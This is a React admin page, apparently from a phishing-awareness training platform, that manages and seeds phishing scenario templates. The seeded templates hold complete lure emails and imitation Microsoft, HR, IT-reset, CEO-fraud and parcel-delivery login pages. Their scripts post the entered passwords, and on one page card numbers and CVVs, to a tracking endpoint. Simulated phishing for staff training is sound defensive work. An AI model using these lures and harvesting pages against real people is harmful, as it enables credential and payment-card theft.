import React, { useState, useEffect } from 'react';
import { Crosshair, Plus, Edit2, Trash2, X, Check, ToggleLeft, ToggleRight, Tag } from 'lucide-react';
import { supabase } from '../../lib/supabase';

const T = {
  bg: '#12140a', bgCard: '#1a1e0e', accent: '#c8ff00', accentDark: '#12140a',
  white: '#ffffff', textBody: '#cbd5e1', textMuted: '#64748b',
  border: 'rgba(255,255,255,0.09)', borderFaint: 'rgba(255,255,255,0.05)',
  green: '#34d399', greenBg: 'rgba(52,211,153,0.08)', greenBorder: 'rgba(52,211,153,0.22)',
  blue: '#60a5fa', blueBg: 'rgba(96,165,250,0.08)', blueBorder: 'rgba(96,165,250,0.22)',
  orange: '#fb923c', orangeBg: 'rgba(251,146,60,0.08)', orangeBorder: 'rgba(251,146,60,0.22)',
  red: '#f87171', redBg: 'rgba(248,113,113,0.08)', redBorder: 'rgba(248,113,113,0.22)',
  purple: '#a78bfa', purpleBg: 'rgba(167,139,250,0.08)', purpleBorder: 'rgba(167,139,250,0.22)',
  gold: '#fbbf24', goldBg: 'rgba(251,191,36,0.08)', goldBorder: 'rgba(251,191,36,0.22)',
} as const;

const STYLES = `
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
  .aw-sc-input, .aw-sc-select, .aw-sc-textarea {
    width: 100%; background: rgba(255,255,255,.04); border: 1px solid rgba(255,255,255,.09);
    border-radius: 10px; font-size: 14px; color: #fff; font-family: 'Inter',sans-serif; outline: none;
    transition: border-color .2s, box-shadow .2s;
  }
  .aw-sc-input, .aw-sc-select { padding: 11px 14px; }
  .aw-sc-textarea { padding: 11px 14px; resize: vertical; min-height: 120px; }
  .aw-sc-textarea.code { font-family: 'Fira Mono','Courier New',monospace; font-size: 13px; min-height: 220px; }
  .aw-sc-input:focus,.aw-sc-select:focus,.aw-sc-textarea:focus {
    border-color: rgba(200,255,0,.45); box-shadow: 0 0 0 3px rgba(200,255,0,.07); background: rgba(255,255,255,.06);
  }
  .aw-sc-select { appearance: none; cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='11' height='11' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 32px; }
  .aw-sc-select option { background: #1a1e0e; }
  .aw-sc-btn { border: none; border-radius: 9px; cursor: pointer; font-family: 'Inter',sans-serif; font-weight: 600; transition: all .15s; }
  .aw-sc-row:hover { background: rgba(255,255,255,.03); }
`;

const CATEGORIES = ['GENERAL','CREDENTIAL_HARVEST','MALWARE','BEC','HR','IT','DELIVERY'];
const DIFFICULTIES = ['EASY','MEDIUM','HARD','EXPERT'];

const DIFF_CFG: Record<string, { color: string; bg: string }> = {
  EASY:   { color: '#34d399', bg: 'rgba(52,211,153,0.12)' },
  MEDIUM: { color: '#fbbf24', bg: 'rgba(251,191,36,0.12)' },
  HARD:   { color: '#fb923c', bg: 'rgba(251,146,60,0.12)' },
  EXPERT: { color: '#f87171', bg: 'rgba(248,113,113,0.12)' },
};

const CAT_CFG: Record<string, { color: string }> = {
  CREDENTIAL_HARVEST: { color: '#f87171' }, MALWARE: { color: '#fb923c' },
  BEC: { color: '#a78bfa' }, HR: { color: '#60a5fa' }, IT: { color: '#34d399' },
  DELIVERY: { color: '#fbbf24' }, GENERAL: { color: '#94a3b8' },
};

interface Scenario {
  id: string; name: string; description: string; category: string; difficulty: string;
  email_subject: string; email_html: string; landing_page_html: string;
  capture_credentials: boolean; redirect_url: string; tags: string[];
  is_active: boolean; sort_order: number; created_at: string;
}

type FormState = Omit<Scenario, 'id' | 'created_at'> & { tags_str: string };
const emptyForm = (): FormState => ({
  name: '', description: '', category: 'CREDENTIAL_HARVEST', difficulty: 'MEDIUM',
  email_subject: '', email_html: '', landing_page_html: '',
  capture_credentials: false, redirect_url: 'https://www.google.com',
  tags: [], tags_str: '', is_active: true, sort_order: 0,
});

const SEEDS: Partial<Scenario>[] = [
  {
    name: 'Microsoft Login Reset', category: 'CREDENTIAL_HARVEST', difficulty: 'HARD',
    description: 'Mimics a Microsoft account security alert requiring immediate password reset.',
    email_subject: 'Action Required: Verify your Microsoft account',
    email_html: `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:32px;">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/200px-Microsoft_logo.svg.png" width="120" style="margin-bottom:24px;" />
<h2 style="color:#1b1b1b;">Unusual sign-in activity detected</h2>
<p style="color:#444;">We've detected unusual sign-in activity on your Microsoft account associated with <strong>{{.Email}}</strong>.</p>
<p style="color:#444;">To protect your account, please verify your identity immediately.</p>
<a href="{{.URL}}" style="display:inline-block;padding:12px 28px;background:#0078d4;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;">Verify My Account</a>
<p style="color:#888;font-size:12px;margin-top:24px;">If you did not initiate this request, you can ignore this email. Microsoft will never ask for your password via email.</p>
<img src="{{.TrackingPixel}}" width="1" height="1" style="display:none;" />
</div>`,
    landing_page_html: `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Microsoft Sign In</title>
<style>body{margin:0;font-family:"Segoe UI",Arial,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.box{background:#fff;padding:44px;border-radius:2px;width:360px;box-shadow:0 2px 6px rgba(0,0,0,.15);}
img{display:block;margin-bottom:24px;}.title{font-size:24px;font-weight:400;margin-bottom:8px;}.subtitle{color:#555;font-size:14px;margin-bottom:24px;}
input{width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #ccc;border-radius:2px;font-size:14px;margin-bottom:16px;outline:none;}
input:focus{border-color:#0078d4;}
button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px;font-size:14px;cursor:pointer;}
button:hover{background:#006cbd;}.forgot{display:block;text-align:center;margin-top:12px;font-size:13px;color:#0078d4;text-decoration:none;}</style></head>
<body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/120px-Microsoft_logo.svg.png" width="100"/>
<div class="title">Sign in</div><div class="subtitle">to continue to Microsoft</div>
<form id="msForm"><input type="email" id="email" placeholder="Email, phone, or Skype" required value="{{.Email}}"/>
<input type="password" id="password" placeholder="Password" required/>
<button type="submit">Sign in</button></form><a href="#" class="forgot">Forgot password?</a></div>
<script>document.getElementById('msForm').addEventListener('submit',function(e){e.preventDefault();
var p=new URLSearchParams(window.location.search);
fetch('/functions/v1/phishing-track?t=submit&c='+p.get('c')+'&r='+p.get('r'),{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('password').value})});
setTimeout(function(){window.location.href='https://www.microsoft.com';},800);});</script></body></html>`,
    capture_credentials: true, redirect_url: 'https://www.microsoft.com',
    tags: ['microsoft','credential-harvest','login'], is_active: true, sort_order: 1,
  },
  {
    name: 'HR Salary Update Notification', category: 'HR', difficulty: 'MEDIUM',
    description: 'Fake HR email about a salary adjustment requiring employee verification.',
    email_subject: '{{.FirstName}}, your salary review is complete — action required',
    email_html: `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:32px;">
<div style="background:#1e3a5f;padding:16px 24px;border-radius:6px 6px 0 0;">
<span style="color:#fff;font-weight:700;font-size:18px;">Human Resources</span>
</div>
<div style="padding:24px 0;">
<p>Dear <strong>{{.FirstName}}</strong>,</p>
<p>We're pleased to inform you that your annual salary review has been completed for the <strong>{{.Department}}</strong> department.</p>
<p>Your updated compensation details are available in the HR portal. Please log in to review and acknowledge your new salary package before <strong>the end of this week</strong>.</p>
<a href="{{.URL}}" style="display:inline-block;padding:12px 24px;background:#1e3a5f;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;margin:12px 0;">View My Salary Details</a>
<p style="color:#666;font-size:13px;">If you have questions, contact <a href="mailto:hr@{{.CompanyDomain}}">hr@{{.CompanyDomain}}</a>.</p>
<p style="color:#666;font-size:13px;">Regards,<br/>HR Department<br/>{{.Company}}</p>
</div>
<img src="{{.TrackingPixel}}" width="1" height="1" style="display:none;" /></div>`,
    landing_page_html: `<!DOCTYPE html><html><head><title>HR Portal</title><style>body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
.card{background:#fff;padding:40px;border-radius:8px;width:380px;box-shadow:0 2px 10px rgba(0,0,0,.1);}
h2{color:#1e3a5f;margin-bottom:4px;}p{color:#666;font-size:14px;margin-bottom:20px;}
input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:12px;}
button{width:100%;padding:12px;background:#1e3a5f;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;}</style></head>
<body><div class="card"><h2>HR Self-Service Portal</h2><p>Sign in to view your salary details.</p>
<form id="hrForm"><input type="text" id="user" placeholder="Employee ID or Email" value="{{.Email}}"/>
<input type="password" id="pass" placeholder="Password"/>
<button type="submit">Access Portal</button></form></div>
<script>document.getElementById('hrForm').addEventListener('submit',function(e){e.preventDefault();
var p=new URLSearchParams(window.location.search);
fetch('/functions/v1/phishing-track?t=submit&c='+p.get('c')+'&r='+p.get('r'),{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({username:document.getElementById('user').value,password:document.getElementById('pass').value})});
setTimeout(function(){window.location.href='https://www.google.com';},600);});</script></body></html>`,
    capture_credentials: true, redirect_url: 'https://www.google.com',
    tags: ['hr','salary','credential-harvest'], is_active: true, sort_order: 2,
  },
  {
    name: 'IT Password Expiry Alert', category: 'IT', difficulty: 'EASY',
    description: 'IT helpdesk notification that the employee password is expiring.',
    email_subject: 'Your password expires in 24 hours — reset now',
    email_html: `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:32px;">
<div style="background:#2d7d46;color:#fff;padding:14px 20px;border-radius:6px;margin-bottom:20px;">
<strong>IT Help Desk — Password Expiry Notice</strong></div>
<p>Hello <strong>{{.FirstName}}</strong>,</p>
<p>Your {{.Company}} network password is set to expire in <strong>24 hours</strong>. To avoid losing access to your systems, please reset your password immediately.</p>
<a href="{{.URL}}" style="display:inline-block;padding:12px 24px;background:#2d7d46;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;">Reset My Password Now</a>
<p style="margin-top:20px;color:#666;font-size:13px;">If you've already reset your password, you can disregard this email.</p>
<p style="color:#666;font-size:13px;">IT Help Desk | {{.Company}}</p>
<img src="{{.TrackingPixel}}" width="1" height="1" style="display:none;" /></div>`,
    landing_page_html: `<!DOCTYPE html><html><head><title>Password Reset</title><style>body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
.box{background:#fff;padding:36px;border-radius:8px;width:360px;box-shadow:0 2px 8px rgba(0,0,0,.12);}
.hdr{background:#2d7d46;color:#fff;padding:12px 16px;border-radius:6px;margin-bottom:20px;font-weight:bold;}
p{color:#555;font-size:14px;}input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:12px;}
button{width:100%;padding:11px;background:#2d7d46;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;}</style></head>
<body><div class="box"><div class="hdr">IT Self-Service Password Reset</div>
<p>Enter your current password and choose a new one.</p>
<form id="pwForm"><input type="text" id="user" placeholder="Username or Email" value="{{.Email}}"/>
<input type="password" id="old" placeholder="Current password"/>
<input type="password" id="new1" placeholder="New password"/>
<input type="password" id="new2" placeholder="Confirm new password"/>
<button type="submit">Change Password</button></form></div>
<script>document.getElementById('pwForm').addEventListener('submit',function(e){e.preventDefault();
var p=new URLSearchParams(window.location.search);
fetch('/functions/v1/phishing-track?t=submit&c='+p.get('c')+'&r='+p.get('r'),{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({username:document.getElementById('user').value,old_password:document.getElementById('old').value,new_password:document.getElementById('new1').value})});
setTimeout(function(){window.location.href='https://www.google.com';},700);});</script></body></html>`,
    capture_credentials: true, redirect_url: 'https://www.google.com',
    tags: ['it','password','helpdesk'], is_active: true, sort_order: 3,
  },
  {
    name: 'CEO Urgent Wire Transfer (BEC)', category: 'BEC', difficulty: 'EXPERT',
    description: 'Business Email Compromise — CEO impersonation requesting urgent action.',
    email_subject: 'Urgent — Please handle this before EOD',
    email_html: `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:24px;background:#fff;">
<p>{{.FirstName}},</p>
<p>I need you to handle something urgently. I'm in a board meeting until 5pm and can't be reached by phone. Please click the link below to review and approve the pending document — it needs to be done before end of day.</p>
<a href="{{.URL}}" style="display:inline-block;padding:10px 22px;background:#c00;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;margin:12px 0;">Review Document Now</a>
<p>Do not discuss this with anyone else in the office. I'll explain everything after the meeting.</p>
<p>Sent from my iPhone</p>
<img src="{{.TrackingPixel}}" width="1" height="1" style="display:none;" /></div>`,
    landing_page_html: `<!DOCTYPE html><html><head><title>Secure Document Portal</title><style>body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
.box{background:#fff;padding:36px;border-radius:6px;width:360px;box-shadow:0 2px 8px rgba(0,0,0,.1);}
h2{margin-bottom:4px;font-size:20px;}p{color:#666;font-size:14px;}
input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ddd;border-radius:4px;margin-bottom:12px;font-size:14px;}
button{width:100%;padding:11px;background:#c00;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px;}</style></head>
<body><div class="box"><h2>🔒 Secure Document Portal</h2><p>Authentication required to access this document.</p>
<form id="docForm"><input type="text" id="user" placeholder="Email Address" value="{{.Email}}"/>
<input type="password" id="pass" placeholder="Password"/>
<button type="submit">Access Document</button></form></div>
<script>document.getElementById('docForm').addEventListener('submit',function(e){e.preventDefault();
var p=new URLSearchParams(window.location.search);
fetch('/functions/v1/phishing-track?t=submit&c='+p.get('c')+'&r='+p.get('r'),{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({email:document.getElementById('user').value,password:document.getElementById('pass').value})});
setTimeout(function(){window.location.href='https://www.google.com';},600);});</script></body></html>`,
    capture_credentials: true, redirect_url: 'https://www.google.com',
    tags: ['bec','ceo-fraud','urgent'], is_active: true, sort_order: 4,
  },
  {
    name: 'Package Delivery Failed', category: 'DELIVERY', difficulty: 'EASY',
    description: 'Fake package delivery notification requesting address verification.',
    email_subject: 'Your package could not be delivered — action required',
    email_html: `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:32px;">
<div style="background:#f5a623;padding:14px 20px;border-radius:6px;margin-bottom:20px;">
<strong style="font-size:16px;">📦 Delivery Notification</strong></div>
<p>Dear Customer,</p>
<p>We attempted to deliver your package today but were unable to complete the delivery to your address. To reschedule your delivery, please verify your address and pay the small redelivery fee of <strong>SAR 5.00</strong>.</p>
<a href="{{.URL}}" style="display:inline-block;padding:12px 24px;background:#f5a623;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;margin:12px 0;">Reschedule My Delivery</a>
<p style="color:#888;font-size:12px;">Package ID: {{.RId}} | This link expires in 24 hours.</p>
<img src="{{.TrackingPixel}}" width="1" height="1" style="display:none;" /></div>`,
    landing_page_html: `<!DOCTYPE html><html><head><title>Reschedule Delivery</title><style>body{font-family:Arial,sans-serif;background:#f9f9f9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
.box{background:#fff;padding:36px;border-radius:8px;width:380px;box-shadow:0 2px 10px rgba(0,0,0,.1);}
h2{color:#f5a623;}p{color:#555;font-size:14px;}
input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ddd;border-radius:4px;margin-bottom:10px;font-size:14px;}
button{width:100%;padding:12px;background:#f5a623;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;}</style></head>
<body><div class="box"><h2>📦 Reschedule Delivery</h2><p>Please verify your address and payment details.</p>
<form id="dlForm">
<input type="text" placeholder="Full Name" value="{{.FirstName}} {{.LastName}}"/>
<input type="text" placeholder="Address"/>
<input type="text" placeholder="City"/>
<input type="text" placeholder="Card Number"/>
<input type="text" placeholder="Expiry (MM/YY)"/>
<input type="text" placeholder="CVV"/>
<button type="submit">Confirm & Pay SAR 5.00</button></form></div>
<script>document.getElementById('dlForm').addEventListener('submit',function(e){e.preventDefault();
var p=new URLSearchParams(window.location.search);var inputs=[...document.querySelectorAll('input')];
var data={};inputs.forEach(function(i,idx){data['field_'+idx]=i.value;});
fetch('/functions/v1/phishing-track?t=submit&c='+p.get('c')+'&r='+p.get('r'),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
setTimeout(function(){window.location.href='https://www.google.com';},700);});</script></body></html>`,
    capture_credentials: true, redirect_url: 'https://www.google.com',
    tags: ['delivery','package','payment'], is_active: true, sort_order: 5,
  },
];

export const PhishingScenariosPage: React.FC = () => {
  const [scenarios, setScenarios] = useState<Scenario[]>([]);
  const [loading, setLoading] = useState(true);
  const [modal, setModal] = useState<'closed' | 'add' | 'edit'>('closed');
  const [editTarget, setEditTarget] = useState<Scenario | null>(null);
  const [form, setForm] = useState<FormState>(emptyForm());
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState('');
  const [deleteId, setDeleteId] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<'email' | 'landing'>('email');

  useEffect(() => { fetchScenarios(); }, []);

  const fetchScenarios = async () => {
    setLoading(true);
    const { data } = await supabase.from('phishing_scenarios').select('*').order('sort_order');
    const list = data || [];
    setScenarios(list);
    if (list.length === 0) await seedScenarios();
    setLoading(false);
  };

  const seedScenarios = async () => {
    await supabase.from('phishing_scenarios').insert(SEEDS as Scenario[]);
    const { data } = await supabase.from('phishing_scenarios').select('*').order('sort_order');
    setScenarios(data || []);
  };

  const openAdd = () => { setForm(emptyForm()); setError(''); setActiveTab('email'); setModal('add'); };
  const openEdit = (s: Scenario) => {
    setEditTarget(s);
    setForm({ ...s, tags_str: s.tags.join(', ') });
    setError(''); setActiveTab('email'); setModal('edit');
  };
  const closeModal = () => { setModal('closed'); setEditTarget(null); };

  const save = async () => {
    if (!form.name.trim() || !form.email_subject.trim()) { setError('Name and email subject are required.'); return; }
    setSaving(true); setError('');
    const payload = { ...form, tags: form.tags_str.split(',').map(t => t.trim()).filter(Boolean) };
    try {
      if (modal === 'add') {
        const { error: e } = await supabase.from('phishing_scenarios').insert(payload);
        if (e) throw e;
      } else if (editTarget) {
        const { error: e } = await supabase.from('phishing_scenarios').update(payload).eq('id', editTarget.id);
        if (e) throw e;
      }
      await fetchScenarios(); closeModal();
    } catch (e: unknown) { setError((e as { message?: string }).message || 'Save failed'); }
    finally { setSaving(false); }
  };

  const toggleActive = async (id: string, val: boolean) => {
    await supabase.from('phishing_scenarios').update({ is_active: val }).eq('id', id);
    setScenarios(prev => prev.map(s => s.id === id ? { ...s, is_active: val } : s));
  };

  const deleteScenario = async (id: string) => {
    await supabase.from('phishing_scenarios').delete().eq('id', id);
    setDeleteId(null); fetchScenarios();
  };

  const card = (s?: React.CSSProperties): React.CSSProperties => ({ background: T.bgCard, border: `1px solid ${T.border}`, borderRadius: 14, ...s });

  const setF = (k: keyof FormState, v: unknown) => setForm(f => ({ ...f, [k]: v }));

  return (
    <div style={{ fontFamily: "'Inter',sans-serif" }}>
      <style>{STYLES}</style>

      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
            <Crosshair size={20} color={T.accent} />
            <h2 style={{ margin: 0, fontSize: 22, fontWeight: 800, color: T.white }}>Phishing Scenarios</h2>
          </div>
          <p style={{ margin: 0, fontSize: 13, color: T.textMuted }}>Predefined attack templates available to all company admins when creating campaigns.</p>
        </div>
        <button className="aw-sc-btn" onClick={openAdd}
          style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '10px 18px', fontSize: 13, background: T.accent, color: T.accentDark }}>
          <Plus size={14} /> Add Scenario
        </button>
      </div>

      <div style={card()}>
        {loading ? (
          <div style={{ padding: 48, textAlign: 'center', color: T.textMuted }}>Loading…</div>
        ) : (
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead>
              <tr style={{ background: 'rgba(255,255,255,.02)' }}>
                {['Scenario','Category','Difficulty','Tags','Credentials','Active',''].map(h => (
                  <th key={h} style={{ padding: '12px 18px', textAlign: 'left', fontSize: 11, fontWeight: 700, color: T.textMuted, letterSpacing: '0.6px', textTransform: 'uppercase' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {scenarios.map((s, i) => {
                const dCfg = DIFF_CFG[s.difficulty] || DIFF_CFG.MEDIUM;
                const cCfg = CAT_CFG[s.category] || CAT_CFG.GENERAL;
                return (
                  <tr key={s.id} className="aw-sc-row" style={{ borderTop: i > 0 ? `1px solid ${T.borderFaint}` : 'none' }}>
                    <td style={{ padding: '14px 18px' }}>
                      <div style={{ fontSize: 14, fontWeight: 600, color: T.white }}>{s.name}</div>
                      <div style={{ fontSize: 12, color: T.textMuted, marginTop: 2 }}>{s.description?.slice(0, 60)}{(s.description?.length ?? 0) > 60 ? '…' : ''}</div>
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      <span style={{ fontSize: 12, fontWeight: 600, color: cCfg.color }}>{s.category.replace('_', ' ')}</span>
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      <span style={{ padding: '3px 9px', borderRadius: 6, fontSize: 11, fontWeight: 700, color: dCfg.color, background: dCfg.bg }}>{s.difficulty}</span>
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                        {(s.tags || []).slice(0, 3).map(t => (
                          <span key={t} style={{ display: 'flex', alignItems: 'center', gap: 3, padding: '2px 7px', background: 'rgba(255,255,255,.06)', borderRadius: 4, fontSize: 11, color: T.textMuted }}>
                            <Tag size={9} />{t}
                          </span>
                        ))}
                      </div>
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      {s.capture_credentials ? <Check size={14} color={T.green} /> : <X size={14} color={T.textMuted} />}
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      <button className="aw-sc-btn" onClick={() => toggleActive(s.id, !s.is_active)}
                        style={{ background: 'none', padding: 0, color: s.is_active ? T.green : T.textMuted }}>
                        {s.is_active ? <ToggleRight size={22} /> : <ToggleLeft size={22} />}
                      </button>
                    </td>
                    <td style={{ padding: '14px 18px' }}>
                      <div style={{ display: 'flex', gap: 8 }}>
                        <button className="aw-sc-btn" onClick={() => openEdit(s)}
                          style={{ padding: '6px 12px', fontSize: 12, background: T.blueBg, color: T.blue, border: `1px solid ${T.blueBorder}` }}>
                          <Edit2 size={12} />
                        </button>
                        <button className="aw-sc-btn" onClick={() => setDeleteId(s.id)}
                          style={{ padding: '6px 12px', fontSize: 12, background: T.redBg, color: T.red, border: `1px solid ${T.redBorder}` }}>
                          <Trash2 size={12} />
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>

      {/* Add/Edit Modal */}
      {modal !== 'closed' && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', zIndex: 1000, display: 'flex', alignItems: 'flex-start', justifyContent: 'center', padding: '40px 20px', overflowY: 'auto' }}>
          <div style={{ ...card(), padding: 28, width: '100%', maxWidth: 760 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 22 }}>
              <h3 style={{ margin: 0, fontSize: 17, fontWeight: 700, color: T.white }}>
                {modal === 'add' ? 'New Scenario' : 'Edit Scenario'}
              </h3>
              <button className="aw-sc-btn" onClick={closeModal} style={{ padding: 6, background: 'rgba(255,255,255,.06)', color: T.textMuted }}><X size={16} /></button>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
              <div style={{ gridColumn: '1/-1' }}>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Scenario Name *</label>
                <input className="aw-sc-input" value={form.name} onChange={e => setF('name', e.target.value)} placeholder="e.g. Microsoft Login Reset" />
              </div>
              <div>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Category</label>
                <select className="aw-sc-select" value={form.category} onChange={e => setF('category', e.target.value)}>
                  {CATEGORIES.map(c => <option key={c}>{c}</option>)}
                </select>
              </div>
              <div>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Difficulty</label>
                <select className="aw-sc-select" value={form.difficulty} onChange={e => setF('difficulty', e.target.value)}>
                  {DIFFICULTIES.map(d => <option key={d}>{d}</option>)}
                </select>
              </div>
              <div style={{ gridColumn: '1/-1' }}>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Description</label>
                <textarea className="aw-sc-textarea" style={{ minHeight: 60 }} value={form.description} onChange={e => setF('description', e.target.value)} placeholder="Brief description of this scenario" />
              </div>
              <div style={{ gridColumn: '1/-1' }}>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Email Subject *</label>
                <input className="aw-sc-input" value={form.email_subject} onChange={e => setF('email_subject', e.target.value)} placeholder="e.g. Action Required: Verify your account" />
              </div>
              <div style={{ gridColumn: '1/-1' }}>
                <label style={{ display: 'block', fontSize: 12, fontWeight: 600, color: T.textMuted, marginBottom: 6 }}>Tags (comma-separated)</label>
                <input className="aw-sc-input" value={form.tags_str} onChange={e => setF('tags_str', e.target.value)} placeholder="e.g. microsoft, login, credential-harvest" />
              </div>
            </div>

            {/* Tabs: email vs landing */}
            <div style={{ display: 'flex', gap: 4, marginBottom: 12 }}>
              {(['email', 'landing'] as const).map(tab => (
                <button key={tab} className="aw-sc-btn" onClick={() => setActiveTab(tab)}
                  style={{ padding: '8px 16px', fontSize: 13,
                    color: activeTab === tab ? T.accent : T.textMuted,
                    background: activeTab === tab ? 'rgba(200,255,0,.10)' : 'none',
                    border: activeTab === tab ? '1px solid rgba(200,255,0,.25)' : '1px solid transparent' }}>
                  {tab === 'email' ? 'Email HTML' : 'Landing Page HTML'}
                </button>
              ))}
            </div>
            {activeTab === 'email' && (
              <textarea className="aw-sc-textarea code" value={form.email_html} onChange={e => setF('email_html', e.target.value)} placeholder="<html>...</html>" />
            )}
            {activeTab === 'landing' && (
              <textarea className="aw-sc-textarea code" value={form.landing_page_html} onChange={e => setF('landing_page_html', e.target.value)} placeholder="<!DOCTYPE html>..." />
            )}

            <div style={{ display: 'flex', alignItems: 'center', gap: 24, marginTop: 16 }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer' }}>
                <input type="checkbox" checked={form.capture_credentials} onChange={e => setF('capture_credentials', e.target.checked)} />
                <span style={{ fontSize: 13, color: T.textBody }}>Capture credentials</span>
              </label>
              <div style={{ flex: 1 }}>
                <input className="aw-sc-input" style={{ fontSize: 13 }} value={form.redirect_url} onChange={e => setF('redirect_url', e.target.value)} placeholder="Redirect URL after submit" />
              </div>
            </div>

            {error && <p style={{ color: T.red, fontSize: 13, margin: '12px 0 0' }}>{error}</p>}

            <div style={{ display: 'flex', gap: 10, marginTop: 22, justifyContent: 'flex-end' }}>
              <button className="aw-sc-btn" onClick={closeModal}
                style={{ padding: '10px 18px', fontSize: 13, background: 'rgba(255,255,255,.06)', color: T.textBody, border: `1px solid ${T.border}` }}>Cancel</button>
              <button className="aw-sc-btn" onClick={save} disabled={saving}
                style={{ padding: '10px 18px', fontSize: 13, background: T.accent, color: T.accentDark, opacity: saving ? 0.7 : 1 }}>
                {saving ? 'Saving…' : 'Save Scenario'}
              </button>
            </div>
          </div>
        </div>
      )}

      {deleteId && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.72)', zIndex: 1001, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <div style={{ ...card(), padding: 28, maxWidth: 380 }}>
            <h3 style={{ margin: '0 0 10px', color: T.white }}>Delete Scenario?</h3>
            <p style={{ margin: '0 0 20px', fontSize: 14, color: T.textMuted }}>This cannot be undone. Existing campaigns using this scenario are not affected.</p>
            <div style={{ display: 'flex', gap: 10 }}>
              <button className="aw-sc-btn" onClick={() => setDeleteId(null)} style={{ flex: 1, padding: '10px 0', fontSize: 13, background: 'rgba(255,255,255,.06)', color: T.textBody, border: `1px solid ${T.border}` }}>Cancel</button>
              <button className="aw-sc-btn" onClick={() => deleteScenario(deleteId)} style={{ flex: 1, padding: '10px 0', fontSize: 13, background: T.red, color: T.white }}>Delete</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
